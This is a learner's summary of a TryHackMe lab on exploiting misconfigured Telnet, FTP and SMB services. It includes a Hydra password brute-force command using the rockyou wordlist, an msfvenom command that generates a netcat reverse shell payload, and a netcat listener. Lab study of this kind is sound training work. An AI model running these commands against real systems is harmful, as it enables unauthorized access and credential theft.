Summary of Learning
Room_Link : https://tryhackme.com/room/networkservices

During this room, we explored misconfigured network services and how to exploit them. Key takeaways:

1. Enumeration & Port Scanning

Enumeration is crucial to identify vulnerabilities.

Used Nmap to scan the target machine for open ports, including non-standard ports.

Identified services like Telnet, FTP, SMB, and others.

2. Telnet

Telnet allows remote command execution but is insecure, sending all communication in plaintext.

SSH has slowly replaced Telnet due to its encrypted communication.

Syntax to connect:
telnet [IP] [PORT]
Weak configurations or backdoors can allow unauthorized access.

Learned about reverse shells using Netcat (nc) for remote access.

3. FTP (File Transfer Protocol)

FTP allows file transfers using a client-server model with separate command and data channels.

Commands and data are sent in plaintext, making FTP insecure if not configured properly.

Exploited weak/default passwords using Hydra:
hydra -t 4 -l [user] -P /usr/share/wordlists/rockyou.txt -vV [IP] ftp

Learned about active vs passive FTP connections.

4. SMB (Server Message Block)

SMB shares can contain valuable information if misconfigured.

Accessed shares using smbclient:
smbclient //[IP]/[SHARE] -U [USERNAME]

Useful for downloading sensitive files and enumerating users.

5. Reverse Shells

Generated a Netcat reverse shell payload using msfvenom:
msfvenom -p cmd/unix/reverse_netcat lhost=[Local IP] lport=[PORT] R

Started a listener on your machine:
nc -lvnp [PORT]

6. General Exploitation Notes

Always check for misconfigurations first; these are often easier than software vulnerabilities.

Be thorough in enumeration: open ports, available services, shares, and user folders can reveal a lot.

Practice using tools like Nmap, Hydra, smbclient, Netcat, and msfvenom for exploitation.
